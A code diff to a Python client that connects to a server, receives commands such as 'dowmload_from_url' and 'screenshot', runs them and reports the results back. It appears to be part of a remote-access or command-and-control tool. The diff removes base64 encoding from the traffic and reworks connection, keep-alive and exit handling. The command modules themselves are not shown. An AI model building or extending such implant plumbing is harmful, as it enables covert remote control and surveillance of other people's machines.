@@ -6,7 +6,7 @@ from queue import Queue
 import time
 from config_client_file import BaseConfig
 from termcolor import colored
-import base64
+
 
 class Client():
     def __init__(self):
@@ -30,7 +30,7 @@ class Client():
             "dowmload_from_url": "execute_dowmload_from_url",
             "screenshot":"excute_screenshot"}
         
-        self.connect()
+        
     
     # Set up connection to server
     def connect(self):
@@ -64,19 +64,25 @@ class Client():
         method = getattr(module, method_name)
 
         # Execute the method with the command payload and arguments
-        result = method(command_args)
-
+        if not command_args:
+            result = method()
+        else:
+            result = method(command_args)
+        
         # Transmit command execution results to server
+       
         status = 'Error' if result.startswith("Error") else 'Finished'
         try:
-            if result:
+            if result: 
                 result_message = {'type': 'result', 'command_id': command_id,'command_type': command_type , 'command_result': result,'command_status':status }
         except Exception as e:
-             return(colored(f"The command could not be executed: {e}","red"))
+            return (colored(f"The command could not be executed: {e}","red"))
 
         # Delete command file
         os.remove(command_file_path)
         return result_message
+            
+
 
     # Handle incoming messages from server
     def handle_message(self ,message):
@@ -91,9 +97,7 @@ class Client():
             message = self._recv(self.client_socket)
             if message:
                 if message["command_type"] == "exit":
-                    self.running = False
-                    result_message = {"command_result" : "exit"}
-                    self._send(self.client_socket,result_message)
+                    self._send(self.client_socket, message)
                     break
                 else:
                  self.handle_message(message)
@@ -103,8 +107,8 @@ class Client():
     def send_keep_alive(self):
         while True:
             try:
-                keep_alive_message = {'result_message': 'keep_alive' }
-                self.client_socket.send(json.dumps(keep_alive_message).encode())
+                keep_alive_message = {'command_type': 'keep_alive' }
+                self._send(self.client_socket , keep_alive_message)
                 time.sleep(self.keep_alive_interval)
             except ConnectionResetError:
                 return(colored("Connection reset by server. Reconnecting..."),"red")
@@ -133,17 +137,17 @@ class Client():
             serialized = json.dumps(data)
         except (TypeError, ValueError):
             raise Exception('You can only send JSON-serializable data')
-        encoded_data = base64.b64encode(serialized.encode('utf-8'))
-        socket.sendall(encoded_data)
+        socket.sendall(serialized.encode('utf-8'))
 
     #Recive data from the server
-    def _recv(self, socket):
-        data = socket.recv(4000)
-        try:
-            deserialized = json.loads(base64.b64decode(data).decode("utf-8"))
-        except (TypeError, ValueError):
-            raise Exception('Data received was not in JSON format')
-        return deserialized
+    def _recv(self ,socket):
+                data = socket.recv(4000).decode("utf-8")
+                if data:
+                    try:
+                        deserialized = json.loads(data)
+                    except (TypeError, ValueError):
+                        raise Exception('Data received was not in JSON format')
+                    return deserialized
 
 
 
@@ -155,6 +159,7 @@ class Client():
 
 
 client = Client()
+client.connect()
 
 
 
